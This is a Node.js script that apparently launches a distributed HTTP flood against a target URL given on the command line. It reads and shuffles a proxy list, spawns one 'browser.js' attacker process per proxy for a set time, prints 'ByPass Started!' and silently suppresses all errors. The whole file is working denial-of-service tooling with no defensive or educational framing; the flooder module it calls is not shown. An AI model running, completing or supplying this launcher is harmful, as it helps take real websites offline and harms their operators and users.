const {spawn} = require('child_process');
const fs = require('fs');


process.on('uncaughtException', function (er) {
});
process.on('unhandledRejection', function (er) {
});

require('events').EventEmitter.defaultMaxListeners = 0;

const validProxies = [];

if (process.argv.length < 5) {
    console.log("node index.js <host> <time> <browserthreads> <threadsfor1browser>");
    process.exit(-1);
}

const urlT = process.argv[2]; // url
const timeT = process.argv[3]; // spam time
threadsT = parseInt(process.argv[4]); // Browser Threads
const threadsP = parseInt(process.argv[5]); // Flooder Threads
const proxies = fs.readFileSync("proxy.txt", 'utf-8').toString().split('\n');
console.log(proxies)

function shuffleFileLines(filePath) {
    const content = fs.readFileSync(filePath, 'utf-8');
    const lines = content.trim().split('\n');

    for (let i = lines.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [lines[i], lines[j]] = [lines[j], lines[i]];
    }

    fs.writeFileSync(filePath, lines.join('\n'));
}

async function Start() {
    console.log(validProxies);
    console.log("ByPass Started!");

    if (proxies.length < threadsT) {
        console.log("не хватает прокси");
        threadsT = proxies.length;
    }

    for (let i = 0; i < threadsT; i++) {
        const child = spawn('node', ['browser.js', urlT, timeT, threadsP, proxies[i]]);

        child.stdout.on('data', (data) => {
            console.log(`stdout: ${data}`);
        });

        child.stderr.on('data', (data) => {
            console.error(`stderr: ${data}`);
        });

        child.on('error', (error) => {
            console.error(`error: ${error.message}`);
        });

        child.on('close', (code) => {
            console.log(`child process exited with code ${code}`);
        });
    }
}

function main() {
    setTimeout(() => {
        shuffleFileLines("proxy.txt");
        return Start();
    }, 1000)
}

main();

setTimeout(() => {
    process.exit(0);
    process.exit(0);
    process.exit(0);
}, timeT * 1000)
